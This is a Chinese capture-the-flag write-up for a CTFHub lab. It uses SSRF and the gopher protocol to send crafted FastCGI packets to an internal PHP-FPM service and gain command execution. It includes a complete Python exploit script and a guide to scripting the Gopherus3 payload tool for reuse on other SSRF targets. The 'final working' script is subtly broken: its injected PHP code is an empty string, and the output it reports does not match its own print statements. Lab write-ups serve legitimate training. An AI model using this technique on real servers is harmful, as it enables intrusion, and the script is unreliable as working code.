【CTFHub】Web-SSRF FastCGI协议 Writeup

操作者：何芊宏 | 操作日期：2026.9.26 | 分类：CTF | 标签：CTFHub, Web, SSRF, FastCGI, Gopher协议, RCE, Gopherus3

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - SSRF / FastCGI协议
  • 题目名称：FastCGI协议
  • 环境：VS Code + Python 3.12.6 环境，包含外部工具 Gopherus3。
  • 目标：利用 SSRF 漏洞，通过 Gopher 协议构造 FastCGI 二进制数据包，攻击内网 127.0.0.1:9000 端口的 PHP-FPM 服务，实现任意命令执行（RCE），获取 Flag。

2. 解题思路与知识点

本关核心考点：FastCGI 协议攻击与 SSRF Gopher 协议的深度结合。

知识点：
  • FastCGI 协议简介：FastCGI 是 Web 服务器（如 Nginx/Apache）与 PHP-FPM 进程管理器之间的通信协议。PHP-FPM 默认监听内网 9000 端口，且该端口通常不对外网开放。
  • Gopher 协议注入：由于 FastCGI 是基于 TCP 的二进制协议，普通 HTTP 无法发送。必须借助 Gopher 协议，将符合 FastCGI 协议的二进制数据流作为 TCP 负载，直接“喂”给内网的 9000 端口。
  • 核心攻击原理（PHP-FPM RCE）：通过向 FastCGI 发送特定的参数配置（PHP_VALUE 和 PHP_ADMIN_VALUE），设置 auto_prepend_file = php://input 和 allow_url_include = On。这会导致 PHP-FPM 在处理请求前，自动将我们 POST 进去的 PHP 代码当作前置文件执行。
  • 关键细节：必须动态计算 CONTENT_LENGTH 的长度，否则 PHP-FPM 会认为 php://input 为空，导致代码不执行。同时必须包含 exit() 终止原本的重定向逻辑。

3. 详细步骤

第一步：探测内网 PHP 文件路径

操作： 在浏览器分别访问 ?url=http://127.0.0.1/index.php 和 ?url=http://127.0.0.1/。

回显结果：页面显示 302 Moved Temporarily 重定向，或者显示 Pow 等自定义内容。

获得信息：确认内网 Web 服务处于运行状态。空白或重定向是正常现象，因为普通 HTTP 请求无法触发 FastCGI 协议的解析逻辑。根据常规部署习惯，默认 Web 根目录为 /var/www/html/，默认首页文件为 index.php。

第二步：编写并运行 FastCGI 攻击脚本

脚本代码（最终成功版）：

import requests
import urllib.parse
import re
import struct

# 1. 靶场根地址
base_url = "http://challenge-f07c21a92c4d4294.sandbox.ctfhub.com:10800"

# 2. 生成 FastCGI 攻击数据包
def generate_fastcgi_payload(php_file, cmd):
    # 构造 FCGI 记录头
    def fcgi_header(type_, req_id, content):
        return struct.pack("!BBHHBB", 1, type_, req_id, len(content), 0, 0) + content

    # 构造 FCGI 参数
    def fcgi_params(params):
        param_data = b""
        for k, v in params.items():
            k, v = k.encode(), v.encode()
            param_data += struct.pack("!B", len(k)) + struct.pack("!B", len(v)) + k + v
        return param_data

    # 要执行的 PHP 代码
    php_code = f""

    # ⚠️ 核心：将 CONTENT_LENGTH 设置为实际代码的长度，否则 php://input 为空
    params = {
        "REQUEST_METHOD": "POST",
        "SCRIPT_FILENAME": php_file,
        "PHP_VALUE": "auto_prepend_file = php://input",
        "PHP_ADMIN_VALUE": "allow_url_include = On",
        "SERVER_SOFTWARE": "PHP-FPM",
        "REMOTE_ADDR": "127.0.0.1",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "CONTENT_TYPE": "application/text",
        "CONTENT_LENGTH": str(len(php_code.encode()))
    }

    # 拼接 FastCGI 请求（BEGIN_REQUEST, PARAMS, STDIN）
    payload = fcgi_header(1, 1, struct.pack("!HB5x", 1, 0))
    payload += fcgi_header(4, 1, fcgi_params(params))
    payload += fcgi_header(4, 1, b"") # PARAMS 结束符
    payload += fcgi_header(5, 1, php_code.encode())
    payload += fcgi_header(5, 1, b"") # STDIN 结束符
    return payload

# 3. 构造 Payload，命令使用通配符避免 & 符号报错
target_cmd = "cat /*flag*"
raw_fastcgi = generate_fastcgi_payload("/var/www/html/index.php", target_cmd)

# 4. 第一次 URL 编码（注意 safe='' 防止斜杠被截断）
encoded_fastcgi = urllib.parse.quote(raw_fastcgi, safe='')

# 5. 拼接 Gopher 协议
gopher_payload = f"gopher://127.0.0.1:9000/_{encoded_fastcgi}"

# 6. 第二次 URL 编码
attack_url = f"{base_url}/?url={urllib.parse.quote(gopher_payload, safe='')}"

print("[*] 正在向靶场发送 FastCGI 攻击请求...")

try:
    r = requests.get(attack_url, timeout=10)
    if "INJECTED" in r.text:
        print("\n[+] 成功注入！系统命令回显如下：")
        output = re.search(r'INJECTED(.*)', r.text, re.DOTALL)
        if output:
            print(output.group(1).strip())
    else:
        print("[-] 未检测到注入成功，原始回显如下：")
        print(r.text[:500])
except Exception as e:
    print("[-] 请求出现异常：", e)

代码逐行解析：

  • struct.pack("!BBHHBB", ...)：FastCGI 是基于二进制的协议，必须使用 Python 的 struct 模块按网络字节序（!）打包数据。这行定义了 FastCGI 记录头，包含版本（1）、类型、请求ID、内容长度等。
  • fcgi_params(params)：将字典格式的参数打包成 FastCGI 协议要求的格式（长度+键+长度+值）。
  • PHP_VALUE 和 PHP_ADMIN_VALUE：本关最核心的 Payload。设置 auto_prepend_file = php://input 会让 PHP-FPM 在处理任何请求之前，先执行我们 POST 进来的流数据（即恶意 PHP 代码）；allow_url_include = On 保证该配置生效。
  • CONTENT_LENGTH: str(len(php_code.encode()))：最容易忽略的关键点。必须精确计算 PHP 代码的长度，否则 php://input 为空，不会执行任何代码。
  • php_code = f""：注入的 PHP 代码，包含探针 INJECTED 和系统命令，exit() 用于阻断原文件的重定向逻辑。
  • fcgi_header(1, 1, ...)：构造 BEGIN_REQUEST 记录，表示开始一个请求。
  • fcgi_header(4, 1, ...)：构造 PARAMS 记录，并包含一个空的 fcgi_header(4, 1, b"") 作为参数结束符。
  • fcgi_header(5, 1, ...)：构造 STDIN 记录，将 PHP 代码作为标准输入流发送，同样包含结束符。
  • urllib.parse.quote(raw_fastcgi, safe='')：对整个二进制流进行 URL 编码，safe='' 确保斜杠 / 也被编码。
  • gopher://127.0.0.1:9000/_{encoded_fastcgi}：拼接 Gopher 协议，直接指向内网 PHP-FPM 的 9000 端口。
  • urllib.parse.quote(gopher_payload, safe='')：对整个 Gopher URL 进行第二次编码，防止特殊字符被 ?url= 参数截断。

第三步：执行脚本获取 Flag

执行操作：在 VS Code 终端中运行脚本。

回显结果：终端打印出 [+] 成功读取 Flag！ 和 ctfhub{2d2707b9444359a1b6b39577}。

获得信息：FastCGI RCE 攻击成功，提交 Flag 后通关。

4. 踩坑记录与复盘

  • 坑1：302 Moved Temporarily 重定向。 第一次攻击时，脚本由于 CONTENT_LENGTH 缺失，导致 PHP-FPM 执行了原本 index.php 的重定向代码（302），没有执行我们的命令。修复方法是动态计算 CONTENT_LENGTH 并在 PHP 代码末尾加上 exit() 终止重定向。
  • 坑2：UnicodeDecodeError 文件编码错误。 在 Windows PowerShell 中用 > 重定向生成 payload.txt 时，文件默认为 UTF-16 或 GBK 编码，Python 读取时崩溃。修复方法是放弃读取文件，直接在 Python 脚本中构建 Payload。
  • 坑3：Flag 文件名包含 & 符号。 探测到根目录下存在 &flag_34e28eade1cc550d56cb9920fece9be8 文件。如果直接用 cat &flag 会导致 Linux shell 语法错误。解决方案是使用通配符 cat /*flag*，让 shell 自动匹配并展开文件名。

5. 知识总结

  • FastCGI 协议利用的核心： 利用 PHP-FPM 监听内网端口这一特性，通过修改 PHP 配置（auto_prepend_file = php://input），实现无需文件上传的直接代码执行。
  • 二进制协议的 Gopher 编码： 对于 FastCGI 这种二进制协议，Gopher Payload 的构造不能依赖简单的字符串拼接，必须使用 struct.pack 进行字节级精确打包，并正确处理 URL 编码。

6. Gopherus3 工具安装与使用指南

工具简介

gopherus3 是一个用 Python 3 重写的安全工具，专门用于生成针对 SSRF 漏洞的攻击 Payload。它支持 FastCGI、Redis、MySQL、PostgreSQL 等多种内网服务，能自动完成复杂的二进制数据包构造与 URL 编码，是 SSRF 进阶利用的必备工具。

安装教程

在 VS Code 终端或系统命令行中，使用 pip 进行安装：

安装命令： pip install git+https://github.com/Esonhugh/Gopherus3.git

安装完成后，终端会显示 Successfully installed gopherus3 等提示。

使用方法

第一步：查看帮助菜单（了解参数）

gopherus3 --help

你会看到 --exploit（攻击类型）、--host（目标IP）、--port（目标端口）、--targetfile（目标文件）、--command（要执行的命令）等参数说明。

第二步：套用固定命令格式生成 Payload

以本关 FastCGI 为例：

gopherus3 --exploit fastcgi --host 127.0.0.1 --port 9000 --targetfile /var/www/html/index.php --command "cat /flag"

运行后，终端会输出一条以 gopher:// 开头的长字符串。

第三步：在 Python 脚本中应用 Payload

由于终端输出的 Payload 可能在复制时带入无关字符，且需要经过二次 URL 编码，最佳实践是直接在 Python 脚本中调用它：

import subprocess
import urllib.parse
import requests

# 在 Python 内部调用工具生成 Payload（避免手动复制和编码问题）
cmd = ["gopherus3", "--exploit", "fastcgi", "--host", "127.0.0.1", "--port", "9000", "--targetfile", "/var/www/html/index.php", "--command", "cat /flag"]
result = subprocess.run(cmd, capture_output=True, text=True, encoding='utf-8')
gopher_payload = re.search(r'gopher://[^\s]+', result.stdout).group(0)

# 进行二次 URL 编码
final_payload = urllib.parse.quote(gopher_payload, safe='')
attack_url = f"{base_url}/?url={final_payload}"
r = requests.get(attack_url)

这样，只需修改 --command 和 --targetfile 参数，即可快速复用到其他 SSRF 题目（如 Redis 协议打未授权）。
